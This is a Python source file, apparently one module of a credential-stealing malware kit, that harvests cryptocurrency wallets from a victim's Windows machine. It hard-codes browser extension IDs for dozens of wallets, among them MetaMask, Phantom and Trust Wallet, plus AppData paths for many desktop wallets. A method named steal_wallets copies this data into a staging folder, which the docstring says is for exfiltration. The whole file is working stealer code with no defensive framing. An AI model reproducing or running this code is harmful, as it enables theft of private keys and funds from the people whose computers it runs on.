"""This module is responsible for extracting wallet data from various cryptocurrency wallets installed on the system. It defines paths to known wallet locations and provides functionality to copy wallet files and extension data to a specified folder for exfiltration."""

import shutil
import os

#----------------------------------------
from modules.Browsers.browser_paths import allBrowsersPath
import log_Style




# this is wallet extanction of browser
EXTANTION_WALLET: dict[str, str] = {
    "Authenticator":   "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
    "Binance":         "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
    "Bitapp":          "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi",
    "BoltX":           "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca",
    "Coin98":          "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg",
    "Coinbase":        "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Core":            "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb",
    "Crocobit":        "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke",
    "Equal":           "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
    "Ever":            "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
    "ExodusWeb3":      "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
    "Fewcha":          "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
    "Finnie":          "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj",
    "Guarda":          "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln",
    "Guild":           "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj",
    "HarmonyOutdated": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
    "Iconex":          "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel",
    "Jaxx Liberty":    "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne",
    "Kaikas":          "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi",
    "KardiaChain":     "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk",
    "Keplr":           "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap",
    "Liquality":       "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn",
    "MEWCX":           "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm",
    "MaiarDEFI":       "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm",
    "Martian":         "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
    "Math":            "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
    "Metamask":        "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Metamask2":       "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
    "Mobox":           "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo",
    "Nami":            "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
    "Nifty":           "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
    "Oxygen":          "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh",
    "PaliWallet":      "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn",
    "Petra":           "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci",
    "Phantom":         "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Pontem":          "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba",
    "Ronin":           "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
    "Safepal":         "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa",
    "Saturn":          "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig",
    "Slope":           "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo",
    "Solfare":         "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic",
    "Sollet":          "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno",
    "Starcoin":        "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk",
    "Swash":           "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog",
    "TempleTezos":     "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc",
    "TerraStation":    "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp",
    "Tokenpocket":     "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii",
    "Ton":             "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd",
    "Tron":            "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "Trust Wallet":    "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
    "Wombat":          "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih",
    "XDEFI":           "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
    "XMR.PT":          "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm",
    "XinPay":          "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo",
    "Yoroi":           "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
    "iWallet":         "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
}


# this is desktoop wallets
APPDATA_PATH: str = os.getenv("APPDATA")
DESKTOP_WALLETS: dict[str, str] = {
    # Bitcoin & Forks
    "Bitcoin": f"{APPDATA_PATH}\\Bitcoin\\wallets",
    "BitcoinCash": f"{APPDATA_PATH}\\BitcoinCash\\wallets",
    "BitcoinGold": f"{APPDATA_PATH}\\BitcoinGold\\wallets",
    "BitcoinSV": f"{APPDATA_PATH}\\BitcoinSV\\wallets",
    "Litecoin": f"{APPDATA_PATH}\\Litecoin\\wallets",
    "Dogecoin": f"{APPDATA_PATH}\\Dogecoin\\wallets",
    "Dash": f"{APPDATA_PATH}\\DashCore\\wallets",
    "Zcash": f"{APPDATA_PATH}\\Zcash\\wallets",
    "Monero": f"{APPDATA_PATH}\\monero\\wallets",
    "Ravencoin": f"{APPDATA_PATH}\\Raven\\wallets",
    "Vertcoin": f"{APPDATA_PATH}\\Vertcoin\\wallets",
    "Decred": f"{APPDATA_PATH}\\Decred\\wallets",
    "DigiByte": f"{APPDATA_PATH}\\DigiByte\\wallets",
    "Komodo": f"{APPDATA_PATH}\\Komodo\\wallets",
    "Pivx": f"{APPDATA_PATH}\\PIVX\\wallets",
    "Qtum": f"{APPDATA_PATH}\\Qtum\\wallets",
    "Stratis": f"{APPDATA_PATH}\\Stratis\\wallets",
    "Syscoin": f"{APPDATA_PATH}\\Syscoin\\wallets",
    "Viacoin": f"{APPDATA_PATH}\\Viacoin\\wallets",
    "Zcoin": f"{APPDATA_PATH}\\Zcoin\\wallets",
    
    # Multi-Currency Wallets
    "Exodus": f"{APPDATA_PATH}\\Exodus\\exodus.wallet",
    "Exodus Wallet": f"{APPDATA_PATH}\\Exodus\\exodus.wallet",
    "AtomicWallet": f"{APPDATA_PATH}\\Atomic\\Local Storage\\leveldb",
    "Jaxx": f"{APPDATA_PATH}\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
    "Coinomi": f"{APPDATA_PATH}\\Coinomi\\Coinomi\\wallets",
    "Guarda": f"{APPDATA_PATH}\\Guarda\\Local Storage\\leveldb",
    "Cake Wallet": f"{APPDATA_PATH}\\com.cakewallet.cake_wallet",
    "Edge Wallet": f"{APPDATA_PATH}\\Edge\\Local Storage\\leveldb",
    "BRD Wallet": f"{APPDATA_PATH}\\brd\\Local Storage\\leveldb",
    "Trust Wallet": f"{APPDATA_PATH}\\TrustWallet\\Local Storage\\leveldb",
    
    # Ethereum Wallets
    "Ethereum": f"{APPDATA_PATH}\\Ethereum\\keystore",
    "EthereumClassic": f"{APPDATA_PATH}\\EthereumClassic\\keystore",
    "Geth": f"{APPDATA_PATH}\\Ethereum\\keystore",
    "Parity": f"{APPDATA_PATH}\\Parity\\Ethereum\\keys",
    "Mist": f"{APPDATA_PATH}\\Mist\\keystore",
    
    # Altcoin Wallets
    "Electrum": f"{APPDATA_PATH}\\Electrum\\wallets",
    "Electrum-LTC": f"{APPDATA_PATH}\\Electrum-LTC\\wallets",
    "Electrum-Doge": f"{APPDATA_PATH}\\Electrum-Doge\\wallets",
    "Electrum-BCH": f"{APPDATA_PATH}\\Electrum-BCH\\wallets",
    "Electrum-Zcash": f"{APPDATA_PATH}\\Electrum-Zcash\\wallets",
    
    # Hardware Wallets Software
    "Ledger Live": f"{APPDATA_PATH}\\Ledger Live\\wallets",
    "Trezor Suite": f"{APPDATA_PATH}\\Trezor Suite\\wallets",
    "SafePal": f"{APPDATA_PATH}\\SafePal\\Local Storage\\leveldb",
    
    # Web/Desktop Hybrid
    "MetaMask": f"{APPDATA_PATH}\\MetaMask\\Local Storage\\leveldb",
    "Binance": f"{APPDATA_PATH}\\Binance\\Local Storage\\leveldb",
    "Coinbase": f"{APPDATA_PATH}\\Coinbase\\Local Storage\\leveldb",
    "Kucoin": f"{APPDATA_PATH}\\Kucoin\\Local Storage\\leveldb",
    
    # Privacy Coins
    "Verge": f"{APPDATA_PATH}\\Verge\\wallets",
    "Grin": f"{APPDATA_PATH}\\grin\\wallet_data",
    "Beam": f"{APPDATA_PATH}\\Beam\\wallets",
    "Zano": f"{APPDATA_PATH}\\zano\\wallets",
    "Masari": f"{APPDATA_PATH}\\masari\\wallets",
    
    # Additional
    "Armory": f"{APPDATA_PATH}\\Armory\\wallets",
    "BitPay": f"{APPDATA_PATH}\\BitPay\\wallets",
    "BreadWallet": f"{APPDATA_PATH}\\bread\\Local Storage\\leveldb",
    "Bytecoin": f"{APPDATA_PATH}\\bytecoin\\wallets",
    "NEM": f"{APPDATA_PATH}\\NEM\\wallets",
    "Cardano": f"{APPDATA_PATH}\\Daedalus\\wallets",
    "Tezos": f"{APPDATA_PATH}\\Tezos\\wallets",
    "Cosmos": f"{APPDATA_PATH}\\Cosmos\\wallets",
    "Polkadot": f"{APPDATA_PATH}\\Polkadot\\wallets",
    "Solana": f"{APPDATA_PATH}\\Solana\\wallets",
}


class Wallets:
    def __init__(self, folder_path: str) -> None:
        
        for wallet_name, path in DESKTOP_WALLETS.items():
            if not os.path.exists(path):
                continue

            self.steal_wallets(path, folder_path, wallet_name)
            
        self.extantion_wallets(folder_path)
            
    # steal wallets folders
    def steal_wallets(self, path: str, new_path: str, wallet_name: str)-> None:
        new_wallet_path: str = os.path.join(new_path, "Wallets", wallet_name)

        if os.path.isdir(path) and os.listdir(path):

            log_Style.ALL_WALLETS_IN_COMPUTER =+ 1
            os.makedirs(new_wallet_path, exist_ok=True)


            try:
                shutil.copytree(path, os.path.join(new_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
            except Exception as err:
                print(err)

        elif os.path.isfile(path):

            log_Style.ALL_WALLETS_IN_COMPUTER += 1
            os.makedirs(new_wallet_path, exist_ok=True)

            try:
                shutil.copy2(path, os.path.join(new_path, os.path.basename(path)))
            except Exception as err:
                print(err)
                
    def extantion_wallets(self, folder: str) -> None:
        browser_path: dict[str, dict[str, str]] = allBrowsersPath()

        profiles: list[str] = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
            'Person 1',
            'Person 2',
            'Person 3',
        ]
        for wallet_name, paths in EXTANTION_WALLET.items():
            for path_browser in browser_path.values():
                
                if not os.path.exists(path_browser['path_data']):
                    continue

                for profile in profiles:
                    all_wallet_path: str = os.path.join(path_browser['path_data'], profile, paths)
                    if not os.path.exists(all_wallet_path):
                        continue
                    
                    try:
                        log_Style.ALL_WALLETS_IN_COMPUTER += 1
                        path_extantion: str = os.path.join(folder, "Extensions Wallet", wallet_name)
                        os.makedirs(path_extantion, exist_ok=True)
                        shutil.copytree(all_wallet_path, os.path.join(path_extantion, os.path.basename(all_wallet_path)))
                    except Exception as err:
                        print(err)